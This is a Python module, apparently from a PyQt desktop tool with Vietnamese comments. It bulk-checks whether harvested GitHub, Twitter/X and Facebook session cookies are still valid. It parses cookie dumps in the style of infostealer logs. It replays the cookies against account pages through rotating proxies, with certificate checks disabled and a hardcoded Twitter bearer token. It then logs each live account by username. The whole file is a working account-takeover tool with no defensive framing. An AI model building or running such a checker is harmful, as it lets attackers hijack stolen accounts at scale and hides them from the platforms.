# core/cookie_checker.py - Bản chuẩn (Khôi phục biến PLATFORMS và logic check)
import os
import re
import json
import zipfile
import rarfile
import requests
import concurrent.futures
from PyQt5.QtCore import QThread, pyqtSignal
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

def _proxy_dict(proxy):
    if not proxy: return None
    p = proxy if proxy.startswith("http") else "http://" + proxy
    return {"http": p, "https": p}

def _session(proxy=None):
    s = requests.Session()
    s.headers.update(HEADERS)
    pd = _proxy_dict(proxy)
    if pd: s.proxies = pd
    return s

def _extract_cookie_block(text):
    cookies = {}
    in_block = False
    for line in text.splitlines():
        if "COOKIE LINES" in line.upper():
            in_block = True
            continue
        if in_block:
            line = line.strip()
            if not line or line.startswith("#"): continue
            parts = line.split("\t")
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
            elif "=" in line and ";" in line:
                for part in line.split(";"):
                    if "=" in part:
                        k, v = part.strip().split("=", 1)
                        cookies[k] = v
    return cookies

# --- CÁC HÀM CHECK COOKIE ---
def check_github_cookie(cookie_data, proxy=None):
    try:
        cookies = _extract_cookie_block(cookie_data)
        if not cookies.get("user_session") and not cookies.get("_gh_sess"): return False
        r = _session(proxy).get("https://github.com/settings/profile", cookies=cookies, timeout=15, verify=False)
        return r.status_code == 200 and "settings" in r.url
    except: return False

def check_twitter_cookie(cookie_data, proxy=None):
    try:
        cookies = _extract_cookie_block(cookie_data)
        ct0 = cookies.get("ct0", "")
        auth = cookies.get("auth_token", "")
        if not ct0 or not auth: return False
        
        h = dict(HEADERS)
        h["Authorization"] = "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA"
        h["X-Csrf-Token"] = ct0
        h["X-Twitter-Auth-Type"] = "OAuth2Session"
        h["X-Twitter-Active-User"] = "yes"
        h["Accept"] = "application/json"
        
        r = _session(proxy).get("https://x.com/i/api/1.1/account/settings.json", cookies=cookies, headers=h, timeout=15, verify=False)
        return r.status_code == 200 and "screen_name" in r.text
    except: return False

def check_facebook_cookie(cookie_data, proxy=None):
    try:
        cookies = _extract_cookie_block(cookie_data)
        if not cookies.get("c_user"): return False
        r = _session(proxy).get("https://www.facebook.com/me", cookies=cookies, timeout=15, verify=False, allow_redirects=True)
        return r.status_code == 200 and "login" not in r.url
    except: return False

# --- DANH SÁCH NỀN TẢNG (BẮT BUỘC PHẢI CÓ) ---
PLATFORMS = {
    "github": {
        "name": "GitHub", 
        "color": "#333333", 
        "check": check_github_cookie, 
        "endpoint": "https://github.com",
        "desc": "Repos, gists, profile"
    },
    "twitter": {
        "name": "Twitter/X", 
        "color": "#1DA1F2", 
        "check": check_twitter_cookie, 
        "endpoint": "https://x.com",
        "desc": "Tweets, followers, analytics"
    },
    "facebook": {
        "name": "Facebook", 
        "color": "#1877F2", 
        "check": check_facebook_cookie, 
        "endpoint": "https://www.facebook.com",
        "desc": "Friends, groups, pages"
    },
}

# --- THREAD CHECK COOKIE ---
class CookieCheckWorker(QThread):
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(int, int)

    def __init__(self, platform, lines, proxies):
        super().__init__()
        self.platform = platform
        self.lines = lines
        self.proxies = proxies

    def run(self):
        check_fn = PLATFORMS[self.platform]["check"]
        live_count = 0
        total = len(self.lines)
        
        self.log_signal.emit(f"[*] Bắt đầu check {total} khối cookie cho {PLATFORMS[self.platform]['name']}...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futures = []
            for i, line in enumerate(self.lines):
                proxy = self.proxies[i % len(self.proxies)] if self.proxies else None
                futures.append(ex.submit(check_fn, line, proxy))
            
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                is_live = future.result()
                if is_live:
                    live_count += 1
                    user_match = re.search(r"User\s*:\s*(\S+)", self.lines[i])
                    user_name = user_match.group(1) if user_match else "Unknown"
                    self.log_signal.emit(f"[LIVE] {user_name} ({PLATFORMS[self.platform]['name']})")
                
                if (i+1) % 5 == 0:
                    self.log_signal.emit(f"[*] Đã check {i+1}/{total}...")

        self.finished_signal.emit(live_count, total)